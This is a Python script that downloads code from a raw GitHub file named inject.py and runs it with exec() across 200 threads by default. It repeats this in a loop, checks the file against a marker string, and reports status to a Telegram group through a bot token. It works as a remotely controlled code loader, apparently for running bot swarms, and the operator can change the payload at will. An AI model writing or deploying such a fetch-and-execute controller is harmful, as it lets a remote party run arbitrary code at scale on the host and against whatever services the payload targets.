import threading
from telegram import Bot
import time, requests, os, sys, random


EXECUTION_CODE="print('test')"

GROUP_NAME = os.environ.get("GROUP_NAME","anonymous").replace("-","—")
THREAD_COUNT = int(os.environ.get("THREADS","200"))
TOKEN=os.environ.get("BOT_TOKEN","NO_BOT_TOKEN")
bot=Bot(TOKEN)

OWNER = 834508473
LOG_GROUP = -1001319740376
ATTEMPT = 0


def LOGGING(text):
  print(text)
  bot.send_message(LOG_GROUP,str(text),parse_mode='MarkdownV2')
  
  
def update_code():
  """this function will check that code need update if yes then it will update EXECUTION_CODE"""
  global EXECUTION_CODE
  RESPONSE_CODE = requests.get("https://raw.githubusercontent.com/I-Himanshu/vcStreamBot/storage/inject.py").text
  if RESPONSE_CODE.startswith("#ADMlNxd"):
    if RESPONSE_CODE != EXECUTION_CODE:
      EXECUTION_CODE = RESPONSE_CODE
      try:
        version=EXECUTION_CODE.split("\n")[0].split(" ")[1]
      except Exception as e:
        LOGGING('⚠️ {} on line {}'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno, type(e).__name__, e))
        version="Undefined"
      LOGGING("#RELOAD\nGroup ```{}``` is updated and restarted successfully\nVersion ```{}```".format(GROUP_NAME,version))
      

def runMyCode(botNo):
  global EXECUTION_CODE,ATTEMPT
  try:
    exec(EXECUTION_CODE)
  except Exception as e:
    LOGGING('#ERROR\n⚠️ {} on line {}'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno, type(e).__name__, e))

  
def make_and_destroy_thread():
  #This Will Make And Remake Threads
  threads = []
  for i in range(int(THREAD_COUNT)):
    thread = threading.Thread(target=runMyCode,args=[i])
    thread.start()
    threads.append(thread)
  for thread in threads:
    thread.join()
  
  try:
    update_code()
    make_and_destroy_thread()
  except Exception as e:
    LOGGING('#ERROR\n⚠️ {} on line {}'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno, type(e).__name__, e))
    raise e
  


try:
  LOGGING("#START\n👶 SERVER ```{}``` IS STARTING WITH {} BOTS".format(GROUP_NAME,THREAD_COUNT))
  update_code()
  make_and_destroy_thread()
except Exception as e:
  LOGGING('#ERROR\n⚠️ {} on line {}'.format(GROUP_NAME,sys.exc_info()[-1].tb_lineno, type(e).__name__, e))
  raise e
